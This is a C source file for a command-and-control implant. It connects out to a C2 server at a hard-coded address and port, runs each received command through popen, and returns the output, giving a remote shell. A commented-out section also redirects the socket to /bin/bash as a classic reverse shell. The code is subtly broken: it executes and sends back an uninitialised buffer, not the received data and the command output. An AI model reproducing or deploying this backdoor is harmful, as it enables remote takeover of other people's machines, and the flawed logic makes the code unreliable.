#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 6666

void execute_command(int socket, char *command) {
  char buffer[1024];
  FILE *fp;
  fp=popen(command,"r");
  if(fp==NULL) {
    strcpy(buffer,"[Err] Failed to execute order\n");
    send(socket,buffer,strlen(buffer),0);
    return;
  }

  while(fgets(buffer,sizeof(buffer),fp)!=NULL) {
    send(socket,buffer,strlen(buffer),0);
  }

  pclose(fp);
}

int main(int argc, char *argv[]) {
  char buffer[1024];
  int sockd;  
  struct sockaddr_in server_addr;
  int read_size;
  char data[1024];

  sockd=socket(AF_INET,SOCK_STREAM,0);
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  server_addr.sin_family=AF_INET;
  server_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
  server_addr.sin_port=htons(6666);
  if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
    perror("[Err] Connection failed");
    close(sockd);
    exit(-1);
  }
  printf("[Info] Connected to C2 at %s:%d\n",SERVER_IP,SERVER_PORT);
  while ((read_size = recv(sockd, data, sizeof(data) - 1, 0)) > 0) {
        buffer[read_size] = '\0';  // Null-terminate the command
        printf("[Info] Received command: %s\n", buffer);

        // Execute the received command using popen
        FILE *fp;
        fp = popen(buffer, "r");
        if (fp == NULL) {
            char error_msg[] = "[Err] Failed to execute command\n";
            send(sockd, error_msg, strlen(error_msg), 0);
            continue;
        }

        // Send the command output back to the C2 server
        while (fgets(data, sizeof(data), fp) != NULL) {
            send(sockd, buffer, strlen(buffer), 0);
        }

        pclose(fp);
    }

    // Handle disconnection
    if (read_size == 0) {
        printf("[Info] C2 server disconnected\n");
    } else if (read_size < 0) {
        perror("[Err] Failed to receive data from server");
    }
  /*dup2(sockd,0);
  dup2(sockd,1);
  dup2(sockd,2);

  char *args[] = {"/bin/bash",NULL};
  execve("/bin/bash",args,NULL);
  */
  close(sockd);

  return 0;
}
